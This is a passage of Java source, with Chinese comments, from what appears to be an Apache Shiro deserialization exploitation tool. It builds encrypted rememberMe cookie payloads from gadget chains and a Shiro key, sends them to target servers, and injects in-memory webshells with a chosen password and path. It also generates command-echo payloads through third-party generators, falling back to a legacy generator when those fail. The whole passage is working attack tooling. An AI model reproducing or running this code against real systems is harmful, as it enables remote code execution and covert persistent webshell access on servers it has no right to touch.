        String label = memTypeLabelForLog != null && !memTypeLabelForLog.trim().isEmpty()
                ? memTypeLabelForLog.trim() : "内存马生成";
        String result = this.injectMemWithCookieAndUserBody(rememberMe, userPart, shellPass, shellPath, logArea, false, label);
        appendResponseSummary(logArea, "[Shiro+InjectMemTool] 已发送", result);
        if (result != null) {
            if (result.length() <= 2000) {
                logArea.appendText(Utils.log(result));
            } else {
                logArea.appendText(Utils.log(result.substring(0, 500) + "..."));
            }
        }
        logArea.appendText(Utils.log("-------------------------------------------------"));
        return result;
    }

    public static boolean looksLikeRememberMeCookiePayload(String raw) {
        if (raw == null) {
            return false;
        }
        String t = raw.trim();
        int eq = t.indexOf('=');
        if (eq <= 0) {
            return false;
        }
        return t.substring(0, eq).trim().equalsIgnoreCase("rememberMe");
    }

    /**
     * jEG 等工具常输出「仅密文」；与 Legacy 一致作为 Shiro Cookie 时应为 {@code rememberMe=密文}。
     *
     * @param headerNameHint jEG 返回的 {@code requestHeaderName}（如 Cookie、rememberMe），可为 null
     */
    public static String coerceRememberMeCookieHeader(String payload, String headerNameHint) {
        if (payload == null) {
            return null;
        }
        String p = payload.trim().replaceAll("\\s+", "");
        if (p.isEmpty()) {
            return null;
        }
        if (looksLikeRememberMeCookiePayload(p)) {
            return p;
        }
        if (p.indexOf('=') >= 0) {
            return null;
        }
        boolean hintRemember = headerNameHint != null
                && ("rememberMe".equalsIgnoreCase(headerNameHint.trim())
                || headerNameHint.toLowerCase(Locale.ROOT).contains("remember"));
        boolean hintCookie = headerNameHint == null || "Cookie".equalsIgnoreCase(headerNameHint.trim());
        if (p.length() >= 32 && (hintRemember || hintCookie)) {
            return "rememberMe=" + p;
        }
        return null;
    }

    /** 得到可写入 {@code Cookie} 头的 rememberMe 行（含 {@code rememberMe=} 前缀）。 */
    public static String resolveRememberMeCookieLine(String payload, String jegHeaderNameHint) {
        if (payload == null) {
            return null;
        }
        String p = payload.trim();
        if (looksLikeRememberMeCookiePayload(p)) {
            return p.replaceAll("\\s+", "");
        }
        return coerceRememberMeCookieHeader(p, jegHeaderNameHint);
    }

    /**
     * 将生成结果仅作为 Cookie（例如 Legacy 回显已加密的 rememberMe=…）发送，不附带 user= Body。
     */
    public String sendRememberMeCookieExploit(String cookieLine, TextArea sink) {
        if (cookieLine == null || cookieLine.trim().isEmpty()) {
            return null;
        }
        String c = cookieLine.trim();
        HashMap<String, String> header = new HashMap<String, String>();
        header.put("Cookie", c);
        TextArea logArea = sink != null ? sink : this.mainController.logTextArea;
        try {
            String result = this.bodyHttpRequest(header, "");
            appendResponseSummary(logArea, "[Cookie] 已发送 rememberMe 载荷，", result);
            if (result != null) {
                if (result.length() <= 2000) {
                    logArea.appendText(Utils.log(result));
                } else {
                    logArea.appendText(Utils.log(result.substring(0, 500) + "..."));
                }
            }
            logArea.appendText(Utils.log("-------------------------------------------------"));
            return result;
        } catch (Exception e) {
            logArea.appendText(Utils.log("[异常] " + e.getMessage()));
            return null;
        }
    }

    public EchoGenerateResult generateEchoWithThirdParty(String source, String serverType, String modelType, String formatType,
                                                         String legacyGadget, String legacyEcho, String shiroKey,
                                                         String jegCmdText, String jegCodeText) {
        try {
            if (source == null || source.trim().isEmpty()) {
                source = "Legacy";
            }
            if ("Legacy".equalsIgnoreCase(source)) {
                String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
                if (rememberMe == null || rememberMe.isEmpty()) {
                    return EchoGenerateResult.fail("Legacy", "Legacy 回显构造失败");
                }
                return EchoGenerateResult.ok("Legacy", rememberMe, "Cookie");
            }

            EchoGenerateRequest request = new EchoGenerateRequest();
            request.setServerType(serverType);
            request.setModelType(modelType);
            request.setFormatType(formatType);
            request.setJegCmdText(jegCmdText);
            request.setJegCodeText(jegCodeText);
            EchoGenerateResult result = generatorFacade.generateEcho(source, request)
                    .withSelection(serverType, modelType, formatType);
            if (!result.isSuccess()) {
                String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
                if (rememberMe != null && !rememberMe.isEmpty()) {
                    this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Echo 生成失败，已自动回退 Legacy"));
                    return EchoGenerateResult.ok("Legacy", rememberMe, "Cookie");
                }
            }
            return result;
        } catch (Exception e) {
            return EchoGenerateResult.fail(source, e.getMessage());
        }
    }

    public MemshellGenerateResult generateMemshellWithThirdParty(String source, String toolType, String serverType,
                                                                 String shellType, String formatType,
                                                                 String gadgetType, String legacyMemshellOption) {
        try {
            if (source == null || source.trim().isEmpty()) {
                source = "Legacy";
            }
            MemshellGenerateRequest request = new MemshellGenerateRequest();
            request.setToolType(toolType);
            request.setServerType(serverType);
            request.setShellType(shellType);
            request.setFormatType(formatType);
            request.setGadgetType(gadgetType);
            request.setOption(legacyMemshellOption);
            MemshellGenerateResult result = generatorFacade.generateMemshell(source, request)
                    .withSelection(toolType, serverType, shellType, formatType, gadgetType);
            if (!result.isSuccess() && !"Legacy".equalsIgnoreCase(source)) {
                String fallbackMessage = result.getMessage();
                this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 生成失败，已自动回退 Legacy"));
                this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 参数: server=" + serverType + ", tool=" + toolType + ", shell=" + shellType + ", format=" + formatType + ", gadget=" + gadgetType));
                if (fallbackMessage != null && !fallbackMessage.trim().isEmpty()) {
                    this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 原始错误: " + fallbackMessage));
                }
                MemshellGenerateResult legacyResult = generatorFacade.generateMemshell("Legacy", request)
                        .withSelection(toolType, serverType, shellType, formatType, gadgetType);
                if (legacyResult.isSuccess()) {
                    return MemshellGenerateResult.okWithFallback(
                            legacyResult.getSource(),
                            legacyResult.getPayload(),
                            legacyResult.getBasicInfo(),
                            legacyResult.getDebugInfo(),
                            source,
                            fallbackMessage
                    ).withSelection(toolType, serverType, shellType, formatType, gadgetType);
                }
                return legacyResult;
            }
            return result;
        } catch (Exception e) {
            return MemshellGenerateResult.fail(source, e.getMessage());
        }
    }

    public static void main(String[] args) {
    }
}
